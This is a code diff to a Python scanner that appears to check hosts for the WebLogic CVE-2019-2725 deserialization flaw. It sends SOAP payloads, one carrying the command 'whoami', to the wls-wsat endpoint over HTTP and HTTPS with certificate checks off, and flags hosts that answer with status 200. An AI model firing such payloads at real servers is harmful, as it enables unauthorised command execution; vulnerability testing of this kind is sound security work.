@@ -35,7 +35,9 @@ def weblogic_10_3_6(ip):
      </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body></soapenv:Body></soapenv:Envelope>"""
+    
 	url="%s/wls-wsat/CoordinatorPortType"%(ip)
+	requests.packages.urllib3.disable_warnings()
 	rsp = requests.post(url, data=body, verify=False, headers=headers)
 	return rsp.status_code,rsp.text
 
@@ -100,31 +102,35 @@ def weblogic_12_1_3(ip):
     </soapenv:Header>
     <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''%("whoami")
 	url="%s/wls-wsat/CoordinatorPortType"%(ip)
+	requests.packages.urllib3.disable_warnings()
 	rsp = requests.post(url, data=body, verify=False, headers=headers)
 	return rsp.status_code,rsp.text
 
 def run(dip,dport,index):
-    ip = "http://{}:{}".format(dip, dport)
-    ip1 = "https://{}:{}".format(dip, dport)
     try:
-        if weblogic_10_3_6(ip)[0]==200:
-            print(Vcolors.RED+ '\t检测存在JAVA deserialization漏洞(CVE-2019-2725)\n\t'+Vcolors.ENDC)
-            a = dip+":"+dport+":检测存在JAVA deserialization漏洞(CVE-2019-2725)"
-            return a
-        elif weblogic_12_1_3(ip)[0]==200:
-            print(Vcolors.RED+ '\t检测存在JAVA deserialization漏洞(CVE-2019-2725)\n\t'+Vcolors.ENDC)
-            a = dip+":"+dport+":检测存在JAVA deserialization漏洞(CVE-2019-2725)"
-            return a
-        else:
-            pass
+        ip = "http://{}:{}".format(dip, dport)
+        ip1 = "https://{}:{}".format(dip, dport)
+        try:
+            if weblogic_10_3_6(ip)[0]==200:
+                print(Vcolors.RED+dip+ '\t检测存在JAVA deserialization漏洞(CVE-2019-2725)'+Vcolors.ENDC)
+                a = dip+":"+dport+":检测存在JAVA deserialization漏洞(CVE-2019-2725)"
+                return a
+            elif weblogic_12_1_3(ip)[0]==200:
+                print(Vcolors.RED+dip+ '\t检测存在JAVA deserialization漏洞(CVE-2019-2725)'+Vcolors.ENDC)
+                a = dip+":"+dport+":检测存在JAVA deserialization漏洞(CVE-2019-2725)"
+                return a
+            else:
+                pass
+        except:
+            if weblogic_10_3_6(ip1)[0]==200:
+                print(Vcolors.RED+ dip+'\t检测存在JAVA deserialization漏洞(CVE-2019-2725)'+Vcolors.ENDC)
+                a = dip+":"+dport+":检测存在JAVA deserialization漏洞(CVE-2019-2725)"
+                return a
+            elif weblogic_12_1_3(ip1)[0]==200:
+                print(Vcolors.RED+dip+ '\t检测存在JAVA deserialization漏洞(CVE-2019-2725)'+Vcolors.ENDC)
+                a = dip+":"+dport+":检测存在JAVA deserialization漏洞(CVE-2019-2725)"
+                return a
+            else:
+                pass
     except:
-        if weblogic_10_3_6(ip1)[0]==200:
-            print(Vcolors.RED+ '\t检测存在JAVA deserialization漏洞(CVE-2019-2725)\n\t'+Vcolors.ENDC)
-            a = dip+":"+dport+":检测存在JAVA deserialization漏洞(CVE-2019-2725)"
-            return a
-        elif weblogic_12_1_3(ip1)[0]==200:
-            print(Vcolors.RED+ '\t检测存在JAVA deserialization漏洞(CVE-2019-2725)\n\t'+Vcolors.ENDC)
-            a = dip+":"+dport+":检测存在JAVA deserialization漏洞(CVE-2019-2725)"
-            return a
-        else:
-            pass
+        pass
